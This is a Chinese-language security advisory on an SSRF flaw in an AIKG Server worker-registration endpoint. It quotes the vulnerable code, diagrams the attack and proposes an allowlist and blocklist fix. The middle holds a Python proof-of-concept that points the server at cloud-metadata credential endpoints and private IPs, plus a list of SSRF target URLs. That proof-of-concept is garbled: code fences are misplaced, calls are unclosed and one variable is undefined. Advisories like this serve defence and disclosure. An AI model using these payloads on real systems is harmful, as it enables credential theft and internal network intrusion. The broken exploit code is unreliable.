# SA-007: Server-Side Request Forgery via Worker Registration

## 漏洞概述

**漏洞类型**: 服务端请求伪造 (SSRF)  
**CWE**: CWE-918 (Server-Side Request Forgery)  
**严重性**: High  
**置信度**: 80/100

AIKG Server 的 `/api/v1/workers/register` 接口允许注册远程 Worker，但只对 loopback 地址（localhost/127.0.0.1/::1）做了简单警告日志，**未验证**内部 IP 范围、云元数据端点等 SSRF 目标。攻击者可注册恶意 Worker URL，诱导 Server 向内部服务发起请求。

---

## 源码分析

### 入口点: server/app.py (第99-117行)

```python
class WorkerRegisterRequest(BaseModel):
    url: str          # ← 用户控制的 URL
    backend: str
    arch: str
    capacity: int = 1
    tags: List[str] = []

def _is_loopback_url(url: str) -> bool:
    """检查 URL 是否为本地回环地址"""
    loopback_patterns = ["localhost", "127.0.0.1", "[::1]"]
    return any(pattern in url for pattern in loopback_patterns)

@app.post("/api/v1/workers/register")
async def register_worker(req: WorkerRegisterRequest):
    """Worker 注册接口"""
    # 只检查 loopback，不检查 SSRF 目标
    if _is_loopback_url(req.url):
        logger.warning(f"Worker registered with loopback URL: {req.url}. ...")
        # 仅警告，不阻止！
    
    # 直接创建 RemoteWorker 并注册
    worker = RemoteWorker(req.url)  # ← SSRF sink
    await get_worker_manager().register(worker, backend=req.backend, ...)
```

### RemoteWorker 实现: remote_worker.py

```python
class RemoteWorker(WorkerInterface):
    def __init__(self, url: str):
        self.url = url
        self.client = httpx.AsyncClient(base_url=url)  # ← HTTP 客户端指向用户 URL
    
    async def verify(self, ...):
        response = await self.client.post("/api/v1/verify", ...)  # ← 向用户 URL 发请求
```

## 攻击路径

```
┌─────────────────────────────────────────────────────────────────────┐
│  1. 攻击者发送 Worker 注册请求                                        │
│     POST /api/v1/workers/register                                   │
│     url = "http://169.254.169.254/latest/meta-data/"                │
│     (AWS/GCP 云元数据端点)                                            │
└─────────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────────┐
│  2. server/app.py 处理                                               │
│     - _is_loopback_url("http://169.254.169.254/...") → False        │
│     - 不是 loopback，直接通过                                         │
│     - 未检查私有 IP 范围 (10.x, 172.16.x, 192.168.x)                 │
│     - 未检查云元数据端点 (169.254.169.254)                           │
└─────────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────────┐
│  3. WorkerManager 注册                                               │
│     RemoteWorker(url="http://169.254.169.254/...")                  │
│     httpx.AsyncClient(base_url=url)                                 │
└─────────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────────┐
│  4. Server 向 Worker 发送任务                                        │
│     await worker.verify(...)                                        │
│     → await self.client.post("/api/v1/verify", ...)                 │
│     → httpx.AsyncClient 向 169.254.169.254 发请求                   │
└─────────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────────┐
│  5. SSRF 成功                                                        │
│     - Server 读取 AWS IAM 角色凭证                                   │
│     - 或访问内部服务 (Kubernetes API, Redis, 等)                     │
│     - 或探测内网拓扑                                                  │

```

import requests

def exploit_ssrf_cloud_metadata(server_url="http://aikg-server:8000"):
    """SSRF 访问 AWS/GCP 云元数据"""
    
    # 注册恶意 Worker指向云元数据端点
    malicious_worker_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    
    response = requests.post(
        f"{server_url}/api/v1/workers/register",
        json={
            "url": malicious_worker_url,
            "backend": "cuda",
            "arch": "a100",
            "capacity": 1,
            "tags": ["malicious"]
        }
    )
    
    print(f"Registration: {response.status_code}")
    
    # 提交任务触发 Server 向 Worker 发请求
    # Server 会调用 await worker.verify() → httpx.post()
    # 实际请求发送到 169.254.169.254

    response = requests.post(
        f"{server_url}/api/v1/workers/register",
        json={
            "url": k8s_api_url,
            "backend": "cuda",
            "arch": "a100",
            "capacity": 1
        }

def exploit_ssrf_private_ip(server_url="http://aikg-server:8000"):
    """SSRF 扫描私有 IP 范围"""
    
    # 注册指向内网 IP 的 Worker
    internal_url = "http://192.168.1.100:8080/admin"

        f"{server_url}/api/v1/workers/register",

**SSRF 目标列表**:
- **AWS**: `http://169.254.169.254/latest/meta-data/`
- **GCP**: `http://metadata.google.internal/computeMetadata/v1/`
- **Azure**: `http://169.254.169.254/metadata/instance`
- **Kubernetes**: `http://10.0.0.1:8080/api/` (API Server)
- **内网服务**: `http://192.168.x.x`, `http://10.x.x.x`, `http://172.16.x.x`

## 修复建议

### 1. URL 白名单验证

```python
import re
from urllib.parse import urlparse

ALLOWED_URL_PATTERNS = [
    r'^https://worker-[a-z0-9]+\.internal\.company\.com$',  # 内部 Worker域名
    r'^http://10\.20\.30\.\d+$',  # 特定私有 IP 范围
]

BLOCKED_IP_RANGES = [
    '127.0.0.0/8',    # Loopback
    '169.254.0.0/16', # Link-local (云元数据)
    '10.0.0.0/8',     # 私有 A类
    '172.16.0.0/12',  # 私有 B类
    '192.168.0.0/16', # 私有 C类
    '::1',            # IPv6 loopback
]

def validate_worker_url(url: str) -> bool:
    """验证 Worker URL"""
    parsed = urlparse(url)
    
    # 1. 协议检查
    if parsed.scheme not in ['http', 'https']:
        return False
    
    # 2. IP 范围检查
    import ipaddress
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        for blocked_range in BLOCKED_IP_RANGES:
            if ip in ipaddress.ip_network(blocked_range):
                return False
    except ValueError:
        pass  # 不是 IP，可能是域名
    
    # 3. 云元数据域名检查
    blocked_domains = ['metadata.google.internal', '169.254.169.254']
    if parsed.hostname in blocked_domains:
        return False
    
    # 4. 白名单检查
    for pattern in ALLOWED_URL_PATTERNS:
        if re.match(pattern, url):
            return True
    
    return False
```
